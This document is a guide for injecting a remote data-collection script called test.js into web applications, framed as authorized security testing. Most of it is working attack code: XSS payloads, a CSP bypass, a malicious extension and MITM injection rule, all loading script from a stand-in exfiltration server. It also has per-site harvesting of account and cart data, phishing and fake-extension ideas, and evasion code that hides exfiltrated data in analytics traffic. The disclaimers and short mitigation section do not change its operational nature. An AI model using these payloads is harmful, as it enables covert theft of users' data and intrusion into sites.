# Universal Web Application Security Testing Implementation Guide

## Overview
This guide explains various methods to implement the security research framework (test.js) on target web applications for authorized security testing and research purposes.

**⚠️ IMPORTANT: This guide is for authorized security testing only. Always obtain explicit written permission before testing any system.**

## Implementation Vectors

### 1. Browser Extension Method (Recommended for Authorized Testing)

Create a browser extension that injects the script for authorized testing:

**manifest.json:**
```json
{
  "manifest_version": 3,
  "name": "Security Research Framework",
  "version": "1.0",
  "content_scripts": [
    {
      "matches": ["*://target-domain.com/*", "*://localhost:*/*"],
      "js": ["inject.js"],
      "run_at": "document_end"
    }
  ],
  "permissions": ["activeTab"]
}
```

**inject.js:**
```javascript
// Set the base URL for your security framework
window.EXFIL_BASE_URL = 'https://your-security-server.com';

// Load and execute the test.js script
fetch('https://your-security-server.com/js/test.js')
  .then(response => response.text())
  .then(script => {
    const scriptElement = document.createElement('script');
    scriptElement.textContent = script;
    document.head.appendChild(scriptElement);
  });
```

### 2. Cross-Site Scripting (XSS) Vectors

If the target application has XSS vulnerabilities:

**Reflected XSS:**
```
https://target-app.com/search?q=<script src="https://your-security-server.com/js/test.js"></script>
```

**Stored XSS (in user profiles, comments, posts):**
```html
<img src="x" onerror="window.EXFIL_BASE_URL='https://your-security-server.com';var s=document.createElement('script');s.src=window.EXFIL_BASE_URL+'/js/test.js';document.head.appendChild(s);">
```

**DOM-based XSS:**
```javascript
// If the application uses unsafe DOM manipulation
document.location = "javascript:window.EXFIL_BASE_URL='https://your-security-server.com';var s=document.createElement('script');s.src=window.EXFIL_BASE_URL+'/js/test.js';document.head.appendChild(s);void(0)";
```

### 3. Content Security Policy Bypass

If the target's CSP allows inline scripts or has weaknesses:

**JSONP Callback Exploitation:**
```html
<script src="https://api.target-app.com/endpoint?callback=eval(window.EXFIL_BASE_URL='https://your-security-server.com';fetch(window.EXFIL_BASE_URL+'/js/test.js').then(r=>r.text()).then(eval))"></script>
```

**Base64 Data URI:**
```javascript
// Encode test.js as base64 and inject
window.EXFIL_BASE_URL = 'https://your-security-server.com';
const encodedScript = btoa(testJsContent);
const script = document.createElement('script');
script.src = 'data:text/javascript;base64,' + encodedScript;
document.head.appendChild(script);
```

### 4. Bookmarklet Implementation

Create a bookmarklet for manual testing:

```javascript
javascript:(function(){
  window.EXFIL_BASE_URL='https://your-security-server.com';
  var s=document.createElement('script');
  s.src=window.EXFIL_BASE_URL+'/js/test.js?t='+Date.now();
  document.head.appendChild(s);
})();
```

### 5. Man-in-the-Middle (MITM) Injection

Using tools like Burp Suite or OWASP ZAP:

**Burp Suite Match/Replace Rule:**
- Match: `</head>`
- Replace: `<script>window.EXFIL_BASE_URL='https://your-security-server.com';</script><script src="https://your-security-server.com/js/test.js"></script></head>`

### 6. Application-Specific Injection Points

**URL Parameters:**
Many applications reflect URL parameters unsafely:
```
https://target-app.com/search?q=test&callback=<script>window.EXFIL_BASE_URL='https://your-security-server.com';</script>
```

**Widget/Embed Exploitation:**
If embedding third-party widgets:
```html
<iframe src="javascript:window.parent.EXFIL_BASE_URL='https://your-security-server.com';var s=document.createElement('script');s.src=window.parent.EXFIL_BASE_URL+'/js/test.js';document.head.appendChild(s);"></iframe>
```

**API Parameter Injection:**
```javascript
// Through API calls that render user-controlled content
fetch('/api/content', {
  method: 'POST',
  body: JSON.stringify({
    content: '<script>window.EXFIL_BASE_URL="https://your-security-server.com";var s=document.createElement("script");s.src=window.EXFIL_BASE_URL+"/js/test.js";document.head.appendChild(s);</script>'
  })
});
```

### 7. Social Engineering Vectors

**Fake Browser Extension:**
Create a malicious browser extension that mimics legitimate functionality while injecting the script.

**Phishing with Script Injection:**
Create a fake login page that executes the script after "authentication."

## Application-Specific Data Collection

Modify test.js to collect application-specific data based on the target:

```javascript
// Add application-specific collection functions
function collectApplicationData() {
  const appData = {};
  
  // E-commerce sites
  if (detectEcommerce()) {
    appData.products = Array.from(document.querySelectorAll('[data-product-id], .product-item')).map(p => ({
      id: p.getAttribute('data-product-id') || p.className,
      name: p.querySelector('.product-name, h3, h2')?.textContent
    }));
    appData.cart = getCartData();
    appData.userAccount = getUserAccountData();
  }
  
  // Social media sites
  if (detectSocialMedia()) {
    appData.posts = Array.from(document.querySelectorAll('[data-post-id], .post, article')).length;
    appData.userProfile = document.querySelector('.username, .profile-name')?.textContent;
    appData.connections = getConnectionData();
  }
  
  // Content management systems
  if (detectCMS()) {
    appData.contentType = getCMSType();
    appData.adminPanels = findAdminPanels();
    appData.plugins = detectPlugins();
  }
  
  return appData;
}

function detectEcommerce() {
  return document.querySelector('.cart, .checkout, [data-price], .product') !== null;
}

function detectSocialMedia() {
  return document.querySelector('.post, .tweet, .status, .feed') !== null;
}

function detectCMS() {
  return document.querySelector('meta[name="generator"]') !== null ||
         /wp-content|drupal|joomla/i.test(document.documentElement.innerHTML);
}
```

## Delivery Methods

### Remote Script Loading
```javascript
// Configure the base URL and load the script
window.EXFIL_BASE_URL = 'https://your-security-server.com';
const script = document.createElement('script');
script.src = window.EXFIL_BASE_URL + '/js/test.js';
script.setAttribute('data-base-url', window.EXFIL_BASE_URL);
script.onload = () => console.log('Security framework data collection active');
document.head.appendChild(script);
```

### Inline Script Injection
```javascript
// Base64 encode the entire test.js content
window.EXFIL_BASE_URL = 'https://your-security-server.com';
const inlineScript = `
  (function() {
    window.EXFIL_BASE_URL = 'https://your-security-server.com';
    // Entire test.js content here, minified
    // This avoids external requests that might be blocked
  })();
`;
```

### Configuration Methods
```javascript
// Method 1: Set global variable before script loads
window.EXFIL_BASE_URL = 'https://your-security-server.com';

// Method 2: Use data attributes
<script src="test.js" data-base-url="https://your-security-server.com"></script>

// Method 3: Environment-style configuration
window.SECURITY_FRAMEWORK_URL = 'https://your-security-server.com';
```

## Evasion Techniques

### Anti-Detection Methods
```javascript
// Randomize function names
const collectServerInfo = window['collect' + Math.random().toString(36).substr(2, 5) + 'Info'];

// Use setTimeout to delay execution
setTimeout(() => {
  // Execute data collection after random delay
}, Math.random() * 5000 + 1000);

// Encrypt data before exfiltration
function encryptData(data) {
  return btoa(JSON.stringify(data));
}

// Obfuscate URLs
function getObfuscatedUrl() {
  const parts = ['https://', 'your-security-', 'server.com'];
  return parts.join('');
}
```

### Domain Fronting and Stealth Methods
```javascript
// Use legitimate services as cover
gtag('event', 'custom_data', {
  'custom_parameter': encodeURIComponent(JSON.stringify(collectedData))
});

// DNS over HTTPS for domain resolution
async function resolveDomain(domain) {
  const response = await fetch(`https://cloudflare-dns.com/dns-query?name=${domain}&type=A`, {
    headers: { 'Accept': 'application/dns-json' }
  });
  return response.json();
}

// Use CDN endpoints as proxies
const cdnEndpoints = [
  'https://cdn.jsdelivr.net/gh/user/repo@main/script.js',
  'https://unpkg.com/package@version/script.js'
];
```

## Legal and Ethical Considerations

**⚠️ CRITICAL: This framework must only be used for authorized purposes**

### Authorized Use Cases:
- ✅ Penetration testing with explicit written authorization
- ✅ Bug bounty programs within defined scope
- ✅ Educational/research purposes on owned systems
- ✅ Security awareness demonstrations with proper consent
- ✅ Red team exercises with organizational approval

### Prohibited Uses:
- ❌ Unauthorized data collection or system access
- ❌ Malicious activities or cybercrimes
- ❌ Privacy violations or data theft
- ❌ Terms of service violations
- ❌ Any illegal activities under applicable laws

### Legal Compliance:
- Always obtain written permission before testing
- Respect privacy laws (GDPR, CCPA, etc.)
- Follow responsible disclosure practices
- Document all testing activities
- Ensure testing scope is clearly defined

## Detection and Mitigation

Target applications can detect and prevent these techniques through:

### Technical Controls:
- **Content Security Policy (CSP)** - Restrict script sources and execution
- **Subresource Integrity (SRI)** - Verify script integrity
- **X-Frame-Options headers** - Prevent iframe embedding
- **Input validation and sanitization** - Prevent XSS attacks
- **Rate limiting and anomaly detection** - Detect unusual behavior

### Security Practices:
- Regular security audits and penetration testing
- Code reviews focused on injection vulnerabilities
- Security awareness training for developers
- Incident response planning
- Vulnerability management programs

## Testing Recommendations

### Pre-Testing Setup:
1. **Obtain Authorization** - Get explicit written permission
2. **Define Scope** - Clearly outline what will be tested
3. **Set Up Infrastructure** - Configure your security server
4. **Prepare Documentation** - Ready for findings and reports

### Testing Process:
1. **Start with Browser Extensions** - Easiest for authorized testing
2. **Test in Isolated Environment** - Use dedicated test accounts
3. **Monitor Network Traffic** - Verify data exfiltration functionality
4. **Document All Findings** - Keep detailed logs for security reports
5. **Practice Responsible Disclosure** - Report vulnerabilities through proper channels

### Framework-Specific Testing:

#### For E-commerce Applications:
- Test payment processing vulnerabilities
- Check for PCI DSS compliance issues
- Verify session management security
- Test for price manipulation vulnerabilities

#### For Social Media Platforms:
- Test privacy controls
- Check for account takeover vulnerabilities  
- Verify content sanitization
- Test direct message security

#### for Content Management Systems:
- Test for privilege escalation
- Check file upload restrictions
- Verify admin panel security
- Test for SQL injection vulnerabilities

### Post-Testing Activities:
1. **Clean Up** - Remove any test data or accounts
2. **Generate Reports** - Document findings professionally
3. **Present Results** - Share with authorized stakeholders
4. **Follow Up** - Verify remediation of identified issues
